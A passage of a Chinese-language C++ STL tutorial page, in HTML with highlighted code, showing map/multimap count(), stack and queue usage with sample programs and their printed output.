data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>执行结果如下：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>m1:</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>0:a     1:aa    2:aaa   3:aaaa  4:aaaaa 5:aaaaaa        6:aaaaaaa</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>找到了键值为 2 的元素，值为：aaa</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>没有找到键值为 33 的元素</pre></td></tr></table></figure><h4 id=\"判断元素在容器中是否存在-2\"><a class=\"anchor\" href=\"#判断元素在容器中是否存在-2\">#</a> 判断元素在容器中是否存在</h4>\n<p>判断元素是否存在，对于 Multimap 容器来说可以知道指定元素有几个。</p>\n<p>可以使用 count 函数来判断元素是否存在，这是一个统计数量的函数，返回值是指定元素的数量。<br />\n<strong>对于 Set 容器来说返回的 0 就是不存在，1 就是存在，单对于 Multimap 容器来说返回 0 为不存在，返回大于 0 则表示存在。</strong></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">MapCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    map<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span> m1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    m1<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">map</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span><span class=\"token operator\">::</span><span class=\"token function\">value_type</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"hh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    m1<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">map</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span><span class=\"token operator\">::</span><span class=\"token function\">value_type</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"hh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    m1<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">map</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span><span class=\"token operator\">::</span><span class=\"token function\">value_type</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"hh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"m1.count(1)的执行结果为：\"</span> <span class=\"token operator\">&lt;&lt;</span> m1<span class=\"token punctuation\">.</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    multimap<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span> mm1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    mm1<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">map</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span><span class=\"token operator\">::</span><span class=\"token function\">value_type</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"hh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    mm1<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">map</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span><span class=\"token operator\">::</span><span class=\"token function\">value_type</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"qq\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    mm1<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">map</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span><span class=\"token operator\">::</span><span class=\"token function\">value_type</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"gg\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    mm1<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">map</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span><span class=\"token operator\">::</span><span class=\"token function\">value_type</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ll\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"mm1.count(4)的执行结果为：\"</span> <span class=\"token operator\">&lt;&lt;</span> mm1<span class=\"token punctuation\">.</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>执行结果：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>m1.count (1) 的执行结果为：1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>mm1.count (4) 的执行结果为：2</pre></td></tr></table></figure><h2 id=\"stack容器\"><a class=\"anchor\" href=\"#stack容器\">#</a> stack 容器</h2>\n<h3 id=\"什么是stack容器\"><a class=\"anchor\" href=\"#什么是stack容器\">#</a> 什么是 stack 容器</h3>\n<p>stack 容器又称之为栈容器，这是一个先进后出顺序的容器，只能进行增加、删除、访问栈顶的元素；其有这几种操作方法：</p>\n<p>push，将元素压入栈；</p>\n<p>top，返回栈顶元素的引用，但不移除；</p>\n<p>pop，从栈中移除栈顶元素，但不返回。</p>\n<p>如下图：</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<h3 id=\"使用stack容器\"><a class=\"anchor\" href=\"#使用stack容器\">#</a> 使用 stack 容器</h3>\n<p>包含头文件：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stack></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>代码如下：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// STL-06-stack.cpp : 此文件包含 \"main\" 函数。程序执行将在此处开始并结束。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stack></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;vector></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;numeric></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">v1</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">v2</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">v3</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token comment\">// 赋值</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"v1:\\t\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token comment\">// 批量递增赋值 vector 的元素</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token function\">iota</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token comment\">// 打印到控制台</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"v2:\\t\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token function\">iota</span><span class=\"token punctuation\">(</span>v2<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v2<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token function\">copy</span><span class=\"token punctuation\">(</span>v2<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v2<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> ostream_iterator<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span>cout<span class=\"token punctuation\">,</span> <span class=\"token string\">\"  \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"v3:\\t\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token function\">iota</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v3<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token function\">copy</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v3<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> ostream_iterator<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span>cout<span class=\"token punctuation\">,</span> <span class=\"token string\">\"  \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\tstack<span class=\"token operator\">&lt;</span>vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">>></span> s1<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 构建了一个空的栈容器</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t<span class=\"token comment\">// 添加元素到栈顶</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\ts1<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\ts1<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>v2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\ts1<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"s1容器的大小s1.size()为：\"</span> <span class=\"token operator\">&lt;&lt;</span> s1<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t<span class=\"token comment\">// 删除栈顶元素，不返回栈顶元素</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\ts1<span class=\"token punctuation\">.</span><span class=\"token function\">pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"s1容器的大小s1.size()为：\"</span> <span class=\"token operator\">&lt;&lt;</span> s1<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t<span class=\"token comment\">// 取栈顶元素，不删除栈顶元素</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> tmp <span class=\"token operator\">=</span> s1<span class=\"token punctuation\">.</span><span class=\"token function\">top</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t<span class=\"token function\">copy</span><span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> tmp<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> ostream_iterator<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span>cout<span class=\"token punctuation\">,</span> <span class=\"token string\">\"  \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t<span class=\"token comment\">// 栈的清空操作</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t<span class=\"token comment\">// 使用 swap () 函数把栈元素和一个临时的栈交换，就一下子清空了</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\tstack<span class=\"token operator\">&lt;</span>vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">>></span> s2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\ts1<span class=\"token punctuation\">.</span><span class=\"token function\">swap</span><span class=\"token punctuation\">(</span>s2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t<span class=\"token comment\">// 可以用 pop 一个一个删除，用 empty () 函数判断栈是否为空</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>s1<span class=\"token punctuation\">.</span><span class=\"token function\">empty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t\ts1<span class=\"token punctuation\">.</span><span class=\"token function\">pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>执行结果如下：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>v1:     0  1  2  3  4</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>v2:     5  6  7  8  9</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>v3:     10  11  12  13  14</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>s1 容器的大小 s1.size () 为：3</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>s1 容器的大小 s1.size () 为：2</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>5  6  7  8  9</pre></td></tr></table></figure><h2 id=\"queue容器\"><a class=\"anchor\" href=\"#queue容器\">#</a> queue 容器</h2>\n<h3 id=\"什么是queue容器\"><a class=\"anchor\" href=\"#什么是queue容器\">#</a> 什么是 queue 容器</h3>\n<p>Stack 容器又称之为队列容器，这是一个先进先出顺序的容器；其有这几种操作方法：</p>\n<p><code>push</code>  ，将元素添加到队列的尾部；<br />\n <code>front</code>  ，返回队列头部的引用，但不移除；<br />\n <code>back</code>  ，返回队列尾部的引用，但不移除；<br />\n <code>pop</code>  ，从队列头部移除元素但不返回。</p>\n<p>示意图：</p>\n<p><img data-src=\"imaage004.png\" alt=\"\" /></p>\n<h3 id=\"使用queue容器\"><a class=\"anchor\" href=\"#使用queue容器\">#</a> 使用 queue 容器</h3>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// STL-07-queue.cpp : 此文件包含 \"main\" 函数。程序执行将在此处开始并结束。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;queue></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tstring <span class=\"token function\">s1</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"qq\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tstring <span class=\"token function\">s2</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ww\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tstring <span class=\"token function\">s3</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ee\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tstring <span class=\"token function\">s4</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rr\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tstring <span class=\"token function\">s5</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tqueue<span class=\"token operator\">&lt;</span>string<span class=\"token operator\">></span> q1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tq1<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>s1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tq1<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>s2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\tq1<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>s3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\tq1<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>s4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\tq1<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>s5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"q1队列的大小为：\"</span> <span class=\"token operator\">&lt;&lt;</span> q1<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\tstring tmp <span class=\"token operator\">=</span> q1<span class=\"token punctuation\">.</span><span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 取队尾元素，不删除队尾元素</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"q1队尾的元素是：\"</span> <span class=\"token operator\">&lt;&lt;</span> tmp <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"q1队列的大小为：\"</span> <span class=\"token operator\">&lt;&lt;</span> q1<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\ttmp <span class=\"token operator\">=</span> q1<span class=\"token punctuation\">.</span><span class=\"token function\">front</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 取队首元素，不删除队首元素</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"q1队首的元素是：\"</span> <span class=\"token operator\">&lt;&lt;</span> tmp <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"q1队列的大小为：\"</span> <span class=\"token operator\">&lt;&lt;</span> q1<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span 